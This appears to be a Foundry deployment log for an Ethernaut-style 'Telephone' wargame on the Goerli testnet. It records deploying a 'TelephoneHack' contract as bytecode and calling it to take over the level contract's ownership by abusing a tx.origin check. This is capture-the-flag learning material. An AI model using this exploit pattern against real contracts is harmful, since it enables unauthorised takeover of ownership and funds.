{
  "transactions": [
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd",
      "function": null,
      "arguments": null,
      "transaction": {
        "type": "0x02",
        "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
        "to": "0xd2e5e0102e55a5234379dd796b8c641cd5996efd",
        "gas": "0x6674e",
        "value": "0x0",
        "data": "0xdfc86b170000000000000000000000001ca9f1c518ec5681c2b7f97c7385c0164c3a22fe",
        "nonce": "0x1917",
        "accessList": []
      },
      "additionalContracts": [
        {
          "transactionType": "CREATE",
          "address": "0xe8849f7481b6F19835d98449d356d285D48095C8",
          "initCode": "608060405234801561001057600080fd5b50600080546001600160a01b03191633179055610157806100326000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a6f9dae114610084575b600080fd5b60005461005b9073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b6100976100923660046100e4565b610099565b005b3233146100e157600080547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff83161790555b50565b6000602082840312156100f657600080fd5b813573ffffffffffffffffffffffffffffffffffffffff8116811461011a57600080fd5b939250505056fea26469706673582212205c9990b04c99d70a19062ac5c0092c3e840fdc8f268951e6e24c3b40ed1317fc64736f6c634300080c0033"
        }
      ],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CREATE",
      "contractName": "TelephoneHack",
      "contractAddress": "0x19b01a89e3b26D2379FCcacf5a6dEE1A5Fb20De7",
      "function": null,
      "arguments": [
        "0xe8849f7481b6F19835d98449d356d285D48095C8"
      ],
      "transaction": {
        "type": "0x02",
        "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
        "gas": "0x31a61",
        "value": "0x0",
        "data": "0x608060405234801561001057600080fd5b5060405161020038038061020083398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61016d806100936000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635898585f1461003b578063c2ed75b114610050575b600080fd5b61004e610049366004610107565b610063565b005b61004e61005e366004610107565b6100c5565b60005460405163a6f9dae160e01b81526001600160a01b0383811660048301529091169063a6f9dae190602401600060405180830381600087803b1580156100aa57600080fd5b505af11580156100be573d6000803e3d6000fd5b5050505050565b736368616e67654f776e657228616464726573732960601b60005260146000206000528060045260008060246000806000545af18061010357600080fd5b5050565b60006020828403121561011957600080fd5b81356001600160a01b038116811461013057600080fd5b939250505056fea264697066735822122025867b6acf3bdcae12608620651c692912bf221f604089edd4a7905f26f4ba7064736f6c63430008120033000000000000000000000000e8849f7481b6f19835d98449d356d285d48095c8",
        "nonce": "0x1918",
        "accessList": []
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": "TelephoneHack",
      "contractAddress": "0x19b01a89e3b26D2379FCcacf5a6dEE1A5Fb20De7",
      "function": "SolidityBuild(address)",
      "arguments": [
        "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
      ],
      "transaction": {
        "type": "0x02",
        "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
        "to": "0x19b01a89e3b26d2379fccacf5a6dee1a5fb20de7",
        "gas": "0xac76",
        "value": "0x0",
        "data": "0x5898585f000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266",
        "nonce": "0x1919",
        "accessList": []
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1685554744,
  "chain": 5,
  "multi": false,
  "commit": "9d0df75"
}